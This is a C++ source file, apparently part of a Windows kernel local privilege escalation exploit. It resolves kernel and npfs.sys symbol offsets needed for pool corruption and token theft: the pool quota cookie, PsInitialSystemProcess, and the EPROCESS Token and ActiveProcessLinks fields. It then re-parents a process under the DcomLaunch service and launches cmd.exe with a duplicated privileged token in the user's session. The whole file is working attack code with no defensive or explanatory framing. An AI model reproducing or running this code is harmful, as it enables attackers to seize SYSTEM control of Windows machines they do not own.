

#include <Windows.h>
#include <comdef.h>
#include <stdio.h>
#include <strsafe.h>
#include "exploit.h"
#include "pdb_file.h"

#define NTBASE 0x400000
#define NPFSBASE 0x400000


class SafeScopedHandle
{
	HANDLE _h;
public:
	SafeScopedHandle() : _h(nullptr)
	{
	}

	SafeScopedHandle(SafeScopedHandle& h)
	{
		_h = h._h;
		h._h = nullptr;
	}

	SafeScopedHandle(SafeScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~SafeScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};


bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return curr_path;
}


HRESULT
GetServiceHandle(
	_In_ LPCWSTR ServiceName,
	_Out_ PHANDLE ProcessHandle
)
{
	SC_HANDLE hScm, hRpc;
	BOOL bRes;
	SERVICE_STATUS_PROCESS procInfo;
	HRESULT hResult;
	DWORD dwBytes;
	HANDLE hProc;

	//
	// Prepare for cleanup
	//
	hScm = NULL;
	hRpc = NULL;

	//
	// Connect to the SCM
	//
	hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hScm == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[+]OpenScManager failed with error %d\n", hResult);
		goto Failure;
	}

	//
	// Open the service
	//
	hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
	if (hRpc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[+]OpenService failed with error %d\n", hResult);
		goto Failure;
	}

	//
	// Query the process information
	//
	bRes = QueryServiceStatusEx(hRpc,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&procInfo,
		sizeof(procInfo),
		&dwBytes);
	if (bRes == FALSE)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[+]QueryServiceStatusEx failed with error %d\n", hResult);
		goto Failure;
	}

	//
	// Open a handle for all access to the PID
	//
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
	if (hProc == NULL)
	{
		hResult = HRESULT_FROM_WIN32(GetLastError());
		printf("[+]OpenProcess failed with error %d\n", hResult);
		goto Failure;
	}

	//
	// Return the PID
	//
	*ProcessHandle = hProc;
	hResult = ERROR_SUCCESS;

Failure:
	//
	// Cleanup the handles
	//
	if (hRpc != NULL)
	{
		CloseServiceHandle(hRpc);
	}
	if (hScm != NULL)
	{
		CloseServiceHandle(hScm);
	}
	return hResult;
}

EXTERN_C int SwapProccess()
{
	NTSTATUS status;	
	HANDLE processTokenHandle;
	BOOL bRes;
	HANDLE parentHandle;
	PPROC_THREAD_ATTRIBUTE_LIST procList;
	STARTUPINFOEX startupInfoEx;
	PROCESS_INFORMATION processInfo;
	SIZE_T listSize;
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);	;
	HRESULT result = GetServiceHandle(L"DcomLaunch", &parentHandle);
	if (FAILED(result))
	{
		printf("[+]Failed to get handle to DcomLaunch service\n");
		return 0;
	}
	printf("[+]Received handle to DcomLaunch\n");

	//
	// Create a new process with DcomLaunch as a parent
	//
	procList = NULL;
	//
	// Figure out the size we need for one attribute (this should always fail)
	//
	bRes = InitializeProcThreadAttributeList(NULL, 1, 0, &listSize);
	if (bRes != FALSE)
	{
		printf("[+]InitializeProcThreadAttributeList succeeded when it should have failed\n");
		return 0;
	}

	//
	// Then allocate it
	//
	procList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		listSize);
	if (procList == NULL)
	{
		printf("[+]Failed to allocate memory\n");
		return 0;
	}
	//
	// Re-initialize the list again
	//
	bRes = InitializeProcThreadAttributeList(procList, 1, 0, &listSize);
	if (bRes == FALSE)
	{
		printf("[+]Failed to initialize procThreadAttributeList\n");
		return 0;
	}
	//
	// Now set the DcomLaunch process as the parent
	//
	bRes = UpdateProcThreadAttribute(procList,
		0,
		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
		&parentHandle,
		sizeof(parentHandle),
		NULL,
		NULL);
	if (bRes == FALSE)
	{
		printf("[+]Failed to update ProcThreadAttribute");
		return 0;
	}
	//
	// Initialize the startup info structure to say that we want to:
	//
	//  1) Hide the window
	//  2) Use the socket as standard in/out/error
	//  3) Use an attribute list
	//
	// Then, spawn the process, again making sure there's no window, and
	// indicating that we have extended attributes.
	//
	RtlZeroMemory(&startupInfoEx, sizeof(startupInfoEx));
	startupInfoEx.StartupInfo.cb = sizeof(startupInfoEx);
	startupInfoEx.StartupInfo.wShowWindow = SW_HIDE;
	startupInfoEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW |
		STARTF_USESTDHANDLES;
	startupInfoEx.lpAttributeList = procList;

	DWORD session_id;
	ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
	WCHAR session_str[16];
	StringCchPrintf(session_str, _countof(session_str), L" lpe %d", session_id);
	BSTR cmdPath = GetExe();
	BSTR exePath = GetExe() + session_str;
	bRes = CreateProcess(cmdPath,
		exePath,
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&startupInfoEx.StartupInfo,
		&processInfo);
	if (bRes == FALSE)
	{
		printf("[+]CreateProcess failed\n");
		return 0;
	}
	printf("[+]Created new process with ID %d\n", processInfo.dwProcessId);
	CloseHandle(processInfo.hThread);
	CloseHandle(processInfo.hProcess);
	return 0;
}

EXTERN_C  int CreateNewProcess(const wchar_t* session)
{




	//DWORD session_id = WTSGetActiveConsoleSessionId();
	DWORD session_id = wcstoul(session, nullptr, 0);
	SafeScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		return (E_FAIL);
	}

	SafeScopedHandle new_token;

	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, new_token.ptr()))
	{
		return (E_FAIL);
	}

	SetTokenInformation(new_token.get(), TokenSessionId, &session_id, sizeof(session_id));

	STARTUPINFOW start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = (LPWSTR)L"WinSta0\\Default";
	PROCESS_INFORMATION proc_info;
	WCHAR cmdline[] = L"cmd.exe";
	if (CreateProcessAsUserW(new_token.get(), nullptr, cmdline,
		nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, &proc_info))
	{
		CloseHandle(proc_info.hProcess);
		CloseHandle(proc_info.hThread);
	}
	//system("pause");
	return 0;
}

EXTERN_C  boolean config(xploit_t* xploit)
{
	boolean ret = false;
	const wchar_t  NTImagePath[] = L"C:\\Windows\\system32\\ntoskrnl.exe";
	const wchar_t  NPFSImagePath[] = L"C:\\Windows\\system32\\drivers\\npfs.sys";
	retdec::pdbparser::PDBFile ntoskrnl;
	retdec::pdbparser::PDBFile npfs;
	const char  ExAllocatePoolWithTag[] = "ExAllocatePoolWithTag";
	const char  ExAllocatePoolWithQuotaTag[] = "ExAllocatePoolWithQuotaTag";
	const char  ExpPoolQuotaCookie[] = "ExpPoolQuotaCookie";
	const char  PsInitialSystemProcess[] = "PsInitialSystemProcess";
	const char  RtlpHpHeapGlobals[] = "RtlpHpHeapGlobals";
	if (ntoskrnl.load_image_file(NTImagePath) == retdec::pdbparser::PDB_STATE_OK) {
		ntoskrnl.initialize();
		//ntoskrnl.print_pdb_file_info();
		retdec::pdbparser::PDBSymbols* pdb_symbols = ntoskrnl.get_symbols_container();
		retdec::pdbparser::PDBTypes* pdb_type = ntoskrnl.get_types_container();
		retdec::pdbparser::PDBFunction* ExAllocatePoolWithTag_Func = pdb_symbols->get_function_by_name(ExAllocatePoolWithTag);
		if (ExAllocatePoolWithTag_Func)
		{
			int ExAllocatePoolWithTag_Offset = ExAllocatePoolWithTag_Func->address - NTBASE;
			printf("[+]offset ExAllocatePoolWithTag  :=> %lx\r\n", ExAllocatePoolWithTag_Offset);
			xploit->nt_allocatepoolwithtag_offset = ExAllocatePoolWithTag_Offset;
		}
		else
		{
			xploit->nt_allocatepoolwithtag_offset = NT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;
			printf("[+]offset ExAllocatePoolWithTag  failed :=> %lx\r\n", xploit->nt_allocatepoolwithtag_offset);
		}

		retdec::pdbparser::PDBGlobalVariable* ExpPoolQuotaCookie_Val = pdb_symbols->get_global_variable_by_name(ExpPoolQuotaCookie);
		retdec::pdbparser::PDBGlobalVariable* PsInitialSystemProcess_Val = pdb_symbols->get_global_variable_by_name(PsInitialSystemProcess);
		retdec::pdbparser::PDBGlobalVariable* RtlpHpHeapGlobals_Val = pdb_symbols->get_global_variable_by_name(RtlpHpHeapGlobals);
		if (ExpPoolQuotaCookie_Val)
		{
			int ExpPoolQuotaCookie_Offset = ExpPoolQuotaCookie_Val->address - NTBASE;
			printf("[+]offset ExpPoolQuotaCookie :=> %lx\r\n", ExpPoolQuotaCookie_Offset);
			xploit->nt_poolquotacookie_offset = ExpPoolQuotaCookie_Offset;
		}
		else
		{
			xploit->nt_poolquotacookie_offset = NT_POOLQUOTACOOKIE_OFFSET_DEFAULT;
			printf("[+]offset ExpPoolQuotaCookie  failed :=> %lx\r\n", xploit->nt_poolquotacookie_offset);
		}

		if (PsInitialSystemProcess_Val)
		{
			int PsInitialSystemProcess_Offset = PsInitialSystemProcess_Val->address - NTBASE;
			printf("[+]offset PsInitialSystemProcess :=> %lx\r\n", PsInitialSystemProcess_Offset);
			xploit->nt_psinitialsystemprocess_offset = PsInitialSystemProcess_Offset;
		}
		else
		{
			xploit->nt_psinitialsystemprocess_offset = NT_PSINITIALSYSTEMPROCESS_OFFSET_DEFAULT;
			printf("[+]offset PsInitialSystemProcess  failed :=> %lx\r\n", xploit->nt_psinitialsystemprocess_offset);
		}
		if (RtlpHpHeapGlobals_Val)
		{
			int RtlpHpHeapGlobals_Offset = RtlpHpHeapGlobals_Val->address - NTBASE;
			printf("[+]offset RtlpHpHeapGlobals :=> %lx\r\n", RtlpHpHeapGlobals_Offset);
			xploit->nt_rtlphpheapglobals_offset = RtlpHpHeapGlobals_Offset;
		}
		else
		{
			xploit->nt_rtlphpheapglobals_offset = NT_RTLPHPHEAPGLOBALS_OFFSET_DEFAULT;
			printf("[+]offset RtlpHpHeapGlobals  failed :=> %lx\r\n", xploit->nt_rtlphpheapglobals_offset);
		}

		const char EPROCESS[] = "_EPROCESS";
		const char ProcessQuotaUsage[] = "ProcessQuotaUsage";
		const char QuotaBlock[] = "QuotaBlock";
		const char ActiveProcessLinks[] = "ActiveProcessLinks";
		const char Token[] = "Token";
		const char ImageFileName[] = "ImageFileName";

		//pdb_type->print_types_by_name(EPROCESS);
		int ProcessQuotaUsage_Offset = pdb_type->get_types_field_offset(EPROCESS, ProcessQuotaUsage);
		int QuotaBlock_Offset = pdb_type->get_types_field_offset(EPROCESS, QuotaBlock);
		int ActiveProcessLinks_Offset = pdb_type->get_types_field_offset(EPROCESS, ActiveProcessLinks);
		int Token_Offset = pdb_type->get_types_field_offset(EPROCESS, Token);
		int ImageFileName_Offset = pdb_type->get_types_field_offset(EPROCESS, ImageFileName);

		if (ImageFileName_Offset)
		{

			printf("[+]offset struct _EPROCESS of ProcessQuotaUsage :=> %lx\r\n", ProcessQuotaUsage_Offset);
			xploit->eprocess_processquotausage = ProcessQuotaUsage_Offset;
		}
		else
		{
			xploit->eprocess_processquotausage = EPROCESS_PROCESSQUOTAUSAGE_DEFAULT;
			printf("[+]offset struct _EPROCESS of ProcessQuotaUsage  failed :=> %lx\r\n", xploit->eprocess_processquotausage);
		}

		if (QuotaBlock_Offset)
		{
			printf("[+]offset struct _EPROCESS of QuotaBlock :=> %lx\r\n", QuotaBlock_Offset);
			xploit->eprocess_quotablock = QuotaBlock_Offset;

		}
		else
		{
			xploit->eprocess_quotablock = EPROCESS_QUOTABLOCK_DEFAULT;
			printf("[+]offset struct _EPROCESS of QuotaBlock  failed :=> %lx\r\n", xploit->eprocess_quotablock);
		}
		if (ActiveProcessLinks_Offset)
		{
			printf("[+]offset struct _EPROCESS of ActiveProcessLinks :=> %lx\r\n", ActiveProcessLinks_Offset);
			xploit->activeprocesslinks_off = ActiveProcessLinks_Offset;
		}
		else
		{
			xploit->activeprocesslinks_off = ACTIVEPROCESSLINKS_OFF_DEFAULT;
			printf("[+]offset struct _EPROCESS of ActiveProcessLinks  failed :=> %lx\r\n", xploit->activeprocesslinks_off);
		}
		if (Token_Offset)
		{
			printf("[+]offset struct _EPROCESS of Token :=> %lx\r\n", Token_Offset);
			xploit->eprocess_token = Token_Offset;
		}
		else
		{
			xploit->eprocess_token = EPROCESS_TOKEN_DEFAULT;
			printf("[+]offset struct _EPROCESS of Token  failed :=> %lx\r\n", xploit->eprocess_token);
		}
		if (ImageFileName_Offset)
		{
			printf("[+]offset struct _EPROCESS of ImageFileName :=> %lx\r\n", ImageFileName_Offset);
			xploit->imagefilename_off = ImageFileName_Offset;
		}
		else
		{
			xploit->imagefilename_off = IMAGEFILENAME_OFF_DEFAULT;
			printf("[+]offset struct _EPROCESS of ImageFileName  failed :=> %lx\r\n", xploit->imagefilename_off);
		}

		ret = true;
	}
	else
	{
		xploit->nt_allocatepoolwithtag_offset = NT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;

		xploit->nt_poolquotacookie_offset = NT_POOLQUOTACOOKIE_OFFSET_DEFAULT;

		xploit->nt_psinitialsystemprocess_offset = NT_PSINITIALSYSTEMPROCESS_OFFSET_DEFAULT;

		xploit->nt_rtlphpheapglobals_offset = NT_RTLPHPHEAPGLOBALS_OFFSET_DEFAULT;

		xploit->eprocess_processquotausage = EPROCESS_PROCESSQUOTAUSAGE_DEFAULT;

		xploit->eprocess_quotablock = EPROCESS_QUOTABLOCK_DEFAULT;

		xploit->activeprocesslinks_off = ACTIVEPROCESSLINKS_OFF_DEFAULT;

		xploit->eprocess_token = EPROCESS_TOKEN_DEFAULT;

		xploit->imagefilename_off = IMAGEFILENAME_OFF_DEFAULT;

		ret = false;
	}
	if (npfs.load_image_file(NPFSImagePath) == retdec::pdbparser::PDB_STATE_OK) {
		npfs.initialize();
		//npfs.print_pdb_file_info();
		const char  NpFsdCreate[] = "NpFsdCreate";
		retdec::pdbparser::PDBSymbols* pdb_symbols_npfs = npfs.get_symbols_container();
		retdec::pdbparser::PDBFunction* NpFsdCreate_Func = pdb_symbols_npfs->get_function_by_name(NpFsdCreate);
		if (NpFsdCreate_Func)
		{
			int NpFsdCreate_Offset = NpFsdCreate_Func->address - NPFSBASE;
			printf("[+]offset NpFsdCreate  :=> %lx\r\n", NpFsdCreate_Offset);
			xploit->npfs_npfsdcreate_offset = NpFsdCreate_Offset;
		}
		else
		{
			xploit->npfs_npfsdcreate_offset = NPFS_NPFSDCREATE_OFFSET_DEFAULT;
			printf("[+]offset NpFsdCreate  failed :=> %lx\r\n", xploit->npfs_npfsdcreate_offset);
		}

		DWORD64 ExAllocatePoolWithTag_Func = npfs.PeGetImportThunkDataRaw("ntoskrnl.exe", ExAllocatePoolWithTag);
		if (ExAllocatePoolWithTag_Func)
		{
			printf("[+]offset GOT_ALLOCATEPOOLWITHTAG  :=> %lx\r\n", ExAllocatePoolWithTag_Func);
			xploit->npfs_got_allocatepoolwithtag_offset = ExAllocatePoolWithTag_Func;
		}
		else
		{
			xploit->npfs_got_allocatepoolwithtag_offset = NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;
			printf("[+]offset GOT_ALLOCATEPOOLWITHTAG  failed :=> %lx\r\n", xploit->npfs_got_allocatepoolwithtag_offset);
		}

		if (ret)
		{
			ret = true;
		}

	}else
	{
		xploit->npfs_npfsdcreate_offset = NPFS_NPFSDCREATE_OFFSET_DEFAULT;
		xploit->npfs_got_allocatepoolwithtag_offset = NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;
	}

	return ret;

}

EXTERN_C  boolean config_default(xploit_t* xploit)
{
	xploit->nt_allocatepoolwithtag_offset = NT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;

	xploit->nt_poolquotacookie_offset = NT_POOLQUOTACOOKIE_OFFSET_DEFAULT;

	xploit->nt_psinitialsystemprocess_offset = NT_PSINITIALSYSTEMPROCESS_OFFSET_DEFAULT;

	xploit->nt_rtlphpheapglobals_offset = NT_RTLPHPHEAPGLOBALS_OFFSET_DEFAULT;

	xploit->eprocess_processquotausage = EPROCESS_PROCESSQUOTAUSAGE_DEFAULT;

	xploit->eprocess_quotablock = EPROCESS_QUOTABLOCK_DEFAULT;

	xploit->activeprocesslinks_off = ACTIVEPROCESSLINKS_OFF_DEFAULT;

	xploit->eprocess_token = EPROCESS_TOKEN_DEFAULT;

	xploit->imagefilename_off = IMAGEFILENAME_OFF_DEFAULT;

	xploit->npfs_npfsdcreate_offset = NPFS_NPFSDCREATE_OFFSET_DEFAULT;

	xploit->npfs_got_allocatepoolwithtag_offset = NPFS_GOT_ALLOCATEPOOLWITHTAG_OFFSET_DEFAULT;
	return true;
}